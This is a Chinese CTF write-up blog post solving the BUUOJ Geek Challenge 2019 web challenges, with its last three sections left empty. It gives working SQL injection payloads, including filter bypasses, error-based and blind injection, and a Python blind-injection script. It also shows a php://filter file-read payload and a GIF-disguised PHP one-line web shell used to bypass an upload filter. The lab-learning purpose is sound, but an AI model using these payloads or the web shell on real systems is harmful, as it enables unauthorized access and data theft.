---
title: BUUOJ   极客大挑战 2019套餐
date: 2020-05-10 23:07:12
tags: CTF WEB
categories: CTF做题记录
---

> 仅为做题思路，记下笔记，如有错误烦请斧正

<!-- TOC -->

- [[极客大挑战 2019]EasySQL](#极客大挑战-2019easysql)
- [[极客大挑战 2019]Havefun](#极客大挑战-2019havefun)
- [[极客大挑战 2019]Secret](#极客大挑战-2019secret)
- [[极客大挑战 2019]LoveSQL](#极客大挑战-2019lovesql)
- [[极客大挑战 2019]Http](#极客大挑战-2019http)
- [[极客大挑战 2019]BabySQL](#极客大挑战-2019babysql)
- [[极客大挑战 2019]BuyFlag](#极客大挑战-2019buyflag)
- [[极客大挑战 2019]Upload](#极客大挑战-2019upload)
- [[极客大挑战 2019]HardSQL](#极客大挑战-2019hardsql)
- [[极客大挑战 2019]FinalSQL](#极客大挑战-2019finalsql)
- [[极客大挑战 2019]Knife](#极客大挑战-2019knife)
- [[极客大挑战 2019]RCE ME](#极客大挑战-2019rce-me)
- [[极客大挑战 2019]PHP](#极客大挑战-2019php)

<!-- /TOC -->

<!--more-->
---
# [极客大挑战 2019]EasySQL
进题目发现是个登陆页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222050509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
admin admin登陆一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222136276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
注意URL，试试万能密码`?username=admin&password=admin' or '1'='1`(tip：当passwd不对时后面的or 1=1恒真导致错误密码也可登陆)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222355982.png)

---
# [极客大挑战 2019]Havefun
题目主页是个可爱的小猫
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222716536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查看源码（weber必做的事哈哈）发现php代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222817108.png)
根据提示传参
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510222856511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [极客大挑战 2019]Secret
哇哦，这背景与文字色
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510223152652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
看源码，发现另一个页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020051022323758.png)
套娃？
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510223315520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
再点
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510223328894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
因为bp一直再开，看看target，把每个response都看了一下，发现跳转了一个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510223617694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
访问一下给了源码，过滤了`../、tp、input、data`穿透和代码执行不行了，直接伪协议读，防止输出过滤加上base64encode，payload：
`?file=php://filter/read=convert.base64-encode/resource=flag.php`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510223650439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
读出来的base解码得到flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510224234473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [极客大挑战 2019]LoveSQL
和第一题界面差不多，最上面的小红字放大看看，弱密码试试依然错误
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510224528634.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510224429468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
我就不用sqlmap了，关于sqlmap扫文件百度有很多，手工sql好了，查列为4的时候报错
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225100127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
联合查询记得把账号置为不存在的（随便输），不然正常回显会把联合查询的回显挤下去，自己可以试试
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225216528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
正常注入，查表名`username=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225526380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查列名`?username=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="l0ve1ysq1"%23&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225629121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查字段`?username=1' union select 1,group_concat(id,":",username,":",password),3 from l0ve1ysq1%23&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225730936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
太乱了，看源码（快跑~）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225831744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [极客大挑战 2019]Http
主页挺好看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510225934274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
没找到有用的信息（Syclover2019招新群：671301484，逃~）看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510230036317.png)
进去看看，考察的是http头信息，具体可百度看师傅们总结的http header
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510230139793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
bp抓包加上`referer`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510230322994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
更改浏览器标识`User-Agent`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510230401508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
`XFF`伪造IP
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200510230506860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
get it

---

# [极客大挑战 2019]BabySQL
万能密码错了，看了报错应该是过滤了==or==
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020051510482868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
双写试试能不给绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515104848883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
简单fuzz一下，可以看到基本函数都被过滤了，不过问题不大，双写就能绕过（why？`str_replace()`函数只把关键字做了一次过滤，并未递归，例如将==seselectect==替换为==select==），注意查表时`information`里面也有个or
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515105726703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查字段：`?username=1' oorrder bbyy 4--+&password=admin`三个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515111513781.png)
查回显位置：`?username=1' ununionion seselectlect 1,2,3--+&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515111615954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查表：`?username=1' ununionion seselectlect 1,group_concat(table_name),3 ffromrom infoorrmation_schema.tables whwhereere table_schema=database()--+&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515111848684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查列：`?username=1' ununionion seselectlect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name="b4bsql"--+&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515111947729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查字段：很尴尬，password里面也有个or忘了双写哈哈
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515112130783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
最终payload：`?username=1' ununionion seselectlect 1,group_concat(id,":",username,":",passwoorrd),3 ffromrom b4bsql--+&password=admin`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515112209804.png)

---
# [极客大挑战 2019]BuyFlag
漂亮的主页要我去买flag，拒绝py，看源码有==pay.php==，好贵，而且只有CUIT的学生才可以买，还要密码，看看源码发现这个
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020051511262696.png)
基础知识，绕过is_numeric，后面加空格/%00。[参考博客](https://www.cnblogs.com/gh-d/p/8085676.html)，
直接输密码应该不对，因为我们还不是CUIT的学生，抓包看看吧
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515113007758.png)
cookie可疑，改成1试试
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515113035735.png)
可以输passwd了，`password=404%20`，记在bp里把请求方式改为==POST==，并加上==Content-Type: application/x-www-form-urlencoded==它用于指示资源的MIME类型
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515113524981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
盲猜传一个money参数
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020051511363089.png)
猜测正确，但是本题采用php5.3版本，此版本不能接受八位长的数字，所以两种办法
- 第一、用科学计数法
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515114023840.png)
  - 第二、猜测后端用的`strcmp()`函数比较的钱数
  	了解strcmp：
  		==int strcmp ( string $str1 , string $str2 )==
  		参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
  		此函数在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0
  		[参考博客](https://www.jianshu.com/p/d91c3357b4d3)
  所以我们用数组绕过也行
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515114519493.png)
---
# [极客大挑战 2019]Upload
先传个🐎试试，shell.php的一句话，提示![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515115046489.png)
后缀改为jpg试试
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515115129364.png)
可能是检测文件头内容，用GIF淦，一句话如下

```js
GIF89a? 
<script language="php">eval($_REQUEST[shell])</script>
```
写到笔记本里。后缀改为gif上传，bp抓包改为php（apache解析，改为gif连不上马儿），发现黑名单了，换个姿势，用==php3、php5、pht、phtml、phpt==，最终还是用了phtml
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515120456144.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515120648394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515120701701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
没给路径，一般在 ==/upload/文件名==里面，试一下，果然（大胆猜测，小心证明）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515120729731.png)
autsword或者菜刀连接，文件太多了，用终端找flag，` find / -name flag`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515121002262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [极客大挑战 2019]HardSQL
还是那个登陆页面，万能密码被逮住了，正常注入不行，双写不可，看看有没有报错注入，过滤了空格 等号 大于号小于号，like代替等号 用括号括起来就可以无空格![在这里插入图片描述](https://img-blog.csdnimg.cn/20200515121145220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
一开始用`--+`没能把后面的语句注释掉，换成`%23`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517085135315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查表`?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517085159939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查列`?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517085259570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查字段`?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(id,":",username,":",password))from(H4rDsq1)),0x7e),1))%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517085539894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
因updatexml回显最多32位，所以可以用==left和right==拼接出来
`?username=admin'or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))%23&password=123`
`?username=admin'or(updatexml(1,concat(0x7e,(select(right(password,22))from(H4rDsq1)),0x7e),1))%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517085750587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020051709002757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
只有报错才行吗？当然不，试了试盲注，虽然`><`被ban了但是还有`like`鸭，淦
查数据库`?username=admin'or(left((database()),1)like'g')%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517090425527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
查表`?username=admin'or(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),1)like'H')%23&password=123`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517092111553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
写个脚本或者bp自动化爆破一下就行，我先挖个坑，不一定填哈哈哈

---
# [极客大挑战 2019]FinalSQL
随便点进去一个页面，id可能sql注入，fuzz\
![fuzz](https://raw.githubusercontent.com/yq1ng/blog/master/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image.png)\
根据题目盲注，又过滤了`union`，应该就是异或注入了，本来想偷懒用大佬的脚本，但是复现失败，flag跑不对，字段太长了后面有误差，但是大佬们直接跑出来全部字段了。。菜鸡自己写个垃圾脚本，用了`length()`和`right()`.
`id=1^1`ERROR；`id=1^0`SUCCESS -->  数字型注入
```python
import requests
url = 'http://c74f4cb6-6b98-4b75-b147-9a4a127baca6.node3.buuoj.cn/search.php'
flag = ''
for i in range(1,250):
    low = 32
    high = 128
    mid = (low+high)//2
    while(low<high):
        
        payload = "?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        res = requests.get(url + payload)
        print(payload)
        if 'Click' in res.text:
            low = mid+1
        else:
            high = mid
        mid = (low+high)//2
    if(mid ==32 or mid ==127):
        break
    flag = flag+chr(mid)
    print(flag)
```


# [极客大挑战 2019]Knife


# [极客大挑战 2019]RCE ME

# [极客大挑战 2019]PHP
